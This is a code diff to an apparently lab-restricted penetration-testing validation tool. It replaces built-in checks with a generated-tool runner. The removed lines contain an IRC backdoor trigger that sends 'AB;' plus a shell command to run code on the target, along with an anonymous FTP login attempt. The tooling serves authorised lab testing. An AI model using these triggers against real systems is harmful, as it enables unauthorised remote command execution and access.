@@ -10,7 +10,6 @@ import time
 import xml.etree.ElementTree as ET
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import asdict, dataclass
-from ftplib import FTP
 from html.parser import HTMLParser
 from pathlib import Path
 from typing import Any
@@ -18,12 +17,11 @@ from urllib.error import URLError
 from urllib.request import Request, urlopen
 
 from .capabilities import select_capabilities_for_services
-from .config_loader import ROOT, load_internal_capabilities_config, load_lab_config
-from .docker_lab import CONTAINER, run_command
+from .config_loader import ROOT, load_lab_config
+from .generated_tools import execute_generated_tool
 
 
 _LAB_CONFIG = load_lab_config()
-_INTERNAL_CAPABILITIES_CONFIG = load_internal_capabilities_config()
 LOCAL_TARGETS = set(_LAB_CONFIG["safety"]["allowed_targets"])
 ALLOWED_CIDRS = [ipaddress.ip_network(cidr) for cidr in _LAB_CONFIG["safety"]["allowed_cidrs"]]
 DEFAULT_TARGET = _LAB_CONFIG["safety"]["default_target"]
@@ -31,7 +29,6 @@ CONTAINER_PORTS = [int(port) for port in _LAB_CONFIG["scan"]["container_ports"]]
 HOST_PORTS = [int(port) for port in _LAB_CONFIG["scan"]["host_ports"]]
 HTTP_CONTAINER_PORTS = [int(port) for port in _LAB_CONFIG["scan"]["http_container_ports"]]
 HTTP_HOST_PORTS = [int(port) for port in _LAB_CONFIG["scan"]["http_host_ports"]]
-EXPLOIT_MARKER = _INTERNAL_CAPABILITIES_CONFIG["proof_marker"]
 
 
 def default_ports_for_target(target: str) -> list[int]:
@@ -545,12 +542,8 @@ def run_one_selected_capability(
             "selection_score": selected.get("score"),
             "selection_reasons": selected.get("reasons", []),
         }
-    if runner == "irc_backdoor_command":
-        result = irc_backdoor_command_validation(target, selected, use_sudo=use_sudo)
-    elif runner == "ftp_anonymous_login":
-        result = ftp_anonymous_login_validation(target, selected)
-    elif runner == "mysql_handshake_probe":
-        result = mysql_handshake_probe_validation(target, selected)
+    if runner == "generated_python_tool":
+        result = generated_python_tool_validation(target, selected, execution_mode=execution_mode)
     elif runner == "nmap_nse_script":
         result = nmap_nse_script_validation(target, selected, execution_mode=execution_mode)
     elif runner == "metasploit_module":
@@ -575,6 +568,25 @@ def run_one_selected_capability(
     return result
 
 
+def generated_python_tool_validation(target: str, capability: dict, execution_mode: str = "safe") -> dict:
+    allowed_modes = capability.get("allowed_execution_modes") or ["safe"]
+    if execution_mode not in allowed_modes:
+        return {
+            "allowed": False,
+            "verified": False,
+            "exploited": False,
+            "reason": f"Generated tool is not allowed in execution mode {execution_mode}. Allowed modes: {', '.join(allowed_modes)}.",
+        }
+    return execute_generated_tool(
+        target,
+        capability,
+        {
+            "execution_mode": execution_mode,
+            "matched_service": capability.get("matched_service") or {},
+        },
+    )
+
+
 def status_counts(results: list[dict[str, Any]]) -> dict[str, int]:
     counts: dict[str, int] = {}
     for item in results:
@@ -592,7 +604,7 @@ def normalize_validation_status(result: dict[str, Any], capability: dict[str, An
         return "confirmed_vulnerability"
     if result.get("verified"):
         runner = (capability or {}).get("runner") or result.get("runner")
-        if runner in {"ftp_anonymous_login", "mysql_handshake_probe"}:
+        if runner == "generated_python_tool":
             return "confirmed_exposure"
         return "confirmed_vulnerability" if result.get("metasploit_action") == "check" else "confirmed_exposure"
     if result.get("reason"):
@@ -907,196 +919,6 @@ def nuclei_template_validation(target: str, capability: dict, execution_mode: st
 def first_configured_port(exploit: dict) -> int | None:
     ports = exploit.get("match", {}).get("ports") or []
     return int(ports[0]) if ports else None
-
-
-def ftp_anonymous_login_validation(target: str, exploit: dict) -> dict:
-    target = validate_target(target)
-    port = first_configured_port(exploit)
-    if port is None:
-        return {
-            "allowed": False,
-            "exploited": False,
-            "verified": False,
-            "reason": "Selected FTP validation is missing match.ports in the capability definition.",
-        }
-    started = time.perf_counter()
-    result: dict[str, object] = {
-        "allowed": True,
-        "target": target,
-        "service": exploit.get("match", {}).get("service", "ftp"),
-        "port": port,
-        "proof_goal": exploit.get("proof_goal", "Attempt anonymous FTP login."),
-        "exploited": False,
-        "verified": False,
-        "cleanup_verified": True,
-    }
-    try:
-        ftp = FTP()
-        ftp.connect(target, port, timeout=5)
-        result["banner_preview"] = ftp.getwelcome()
-        login_response = ftp.login("anonymous", "anonymous@example.com")
-        result["login_response"] = login_response
-        result["proof_output"] = f"Anonymous FTP login succeeded: {login_response}"
-        result["verified"] = True
-        ftp.quit()
-    except Exception as exc:
-        result["proof_output"] = ""
-        result["reason"] = f"Anonymous FTP login did not succeed: {exc}"
-    result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
-    return result
-
-
-def mysql_handshake_probe_validation(target: str, exploit: dict) -> dict:
-    target = validate_target(target)
-    port = first_configured_port(exploit)
-    if port is None:
-        return {
-            "allowed": False,
-            "exploited": False,
-            "verified": False,
-            "reason": "Selected MySQL validation is missing match.ports in the capability definition.",
-        }
-    started = time.perf_counter()
-    result: dict[str, object] = {
-        "allowed": False,
-        "exploited": False,
-        "verified": False,
-        "cleanup_verified": True,
-        "target": target,
-        "service": exploit.get("match", {}).get("service", "mysql"),
-        "port": port,
-        "proof_goal": exploit.get("proof_goal", "Probe MySQL handshake."),
-    }
-    try:
-        with socket.create_connection((target, port), timeout=5) as sock:
-            sock.settimeout(3)
-            banner = sock.recv(128)
-        result["allowed"] = True
-        result["banner_hex_preview"] = banner[:64].hex()
-        result["proof_output"] = "MySQL handshake received before authentication."
-        result["verified"] = bool(banner)
-    except Exception as exc:
-        result["allowed"] = True
-        result["reason"] = f"MySQL handshake probe failed: {exc}"
-    result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
-    return result
-
-
-def irc_backdoor_command_validation(target: str, exploit: dict, use_sudo: bool = False) -> dict:
-    """Run the configured benign remote-command proof against an IRC lab service."""
-    target = validate_target(target)
-    if target != DEFAULT_TARGET:
-        return {
-            "allowed": False,
-            "exploited": False,
-            "reason": f"Exploit validation is restricted to the configured lab target {DEFAULT_TARGET}.",
-        }
-    ports = exploit.get("match", {}).get("ports") or []
-    if not ports:
-        return {
-            "allowed": False,
-            "exploited": False,
-            "verified": False,
-            "reason": "Selected exploit is missing match.ports in the capability definition.",
-        }
-    port = int(ports[0])
-
-    result: dict[str, object] = {
-        "allowed": True,
-        "target": target,
-        "service": exploit.get("match", {}).get("service", ""),
-        "port": port,
-        "marker": EXPLOIT_MARKER,
-        "proof_goal": exploit.get("proof_goal", "Run configured benign proof command."),
-        "exploited": False,
-        "verified": False,
-        "cleanup": False,
-    }
-    started = time.perf_counter()
-    command = exploit.get("proof_command", "id > {marker}").format(marker=EXPLOIT_MARKER)
-    preclean = run_command(
-        ["docker", "exec", CONTAINER, "rm", "-f", EXPLOIT_MARKER],
-        timeout=15,
-        use_sudo=use_sudo,
-    )
-    result["preclean"] = preclean.returncode == 0
-    sent = False
-    throttle_banners: list[str] = []
-    for connect_attempt in range(1, 7):
-        try:
-            with socket.create_connection((target, port), timeout=5) as sock:
-                sock.settimeout(2)
-                try:
-                    banner = sock.recv(4096).decode("utf-8", errors="replace")
-                except Exception:
-                    banner = ""
-                result["banner_preview"] = banner[:300]
-                result["connect_attempts"] = connect_attempt
-                if "throttled" in banner.lower():
-                    result["throttle_observed"] = True
-                    throttle_banners.append(banner[:300])
-                    time.sleep(min(30, 8 + (connect_attempt * 4)))
-                    continue
-                sock.sendall(f"AB;{command}\n".encode("utf-8"))
-                result["sent_benign_remote_command"] = True
-                sent = True
-                time.sleep(0.5)
-                break
-        except Exception as exc:
-            result["error"] = repr(exc)
-            if connect_attempt < 6:
-                time.sleep(3)
-                continue
-            result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
-            return result
-    if not sent:
-        result["reason"] = "Could not send proof command to IRC service after retry/backoff."
-        if throttle_banners:
-            result["reason"] = "IRC service throttled all exploit validation connection attempts."
-            result["throttle_banners"] = throttle_banners
-        result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
-        return result
-
-    verify = None
-    for attempt in range(1, 11):
-        time.sleep(0.5)
-        verify = run_command(
-            ["docker", "exec", CONTAINER, "cat", EXPLOIT_MARKER],
-            timeout=15,
-            use_sudo=use_sudo,
-        )
-        if verify.returncode == 0:
-            result["verify_attempts"] = attempt
-            break
-    if verify is None:
-        raise RuntimeError("verification loop did not run")
-    result["verify_returncode"] = verify.returncode
-    result["proof_output"] = verify.stdout
-    result["verify_stderr"] = verify.stderr
-    result["verification_available"] = verify.returncode == 0 or "permission denied" not in verify.stderr.lower()
-    if "password is required" in verify.stderr.lower() or "terminal is required" in verify.stderr.lower():
-        result["verification_available"] = False
-        result["verification_note"] = "Docker verification requires running the CLI with Docker permissions, for example through sudo."
-    result["verified"] = verify.returncode == 0
-    result["exploited"] = verify.returncode == 0
-    if not result["verified"]:
-        result["reason"] = verify.stderr or "Proof file was not created by the IRC validation command."
-    cleanup = run_command(
-        ["docker", "exec", CONTAINER, "rm", "-f", EXPLOIT_MARKER],
-        timeout=15,
-        use_sudo=use_sudo,
-    )
-    result["cleanup"] = cleanup.returncode == 0
-    result["cleanup_stderr"] = cleanup.stderr
-    cleanup_verify = run_command(
-        ["docker", "exec", CONTAINER, "test", "!", "-f", EXPLOIT_MARKER],
-        timeout=15,
-        use_sudo=use_sudo,
-    )
-    result["cleanup_verified"] = cleanup_verify.returncode == 0
-    result["cleanup_verify_stderr"] = cleanup_verify.stderr
-    result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
-    return result
 
 
 def parse_nmap_open_services(nmap_output: str) -> list[dict[str, str]]:
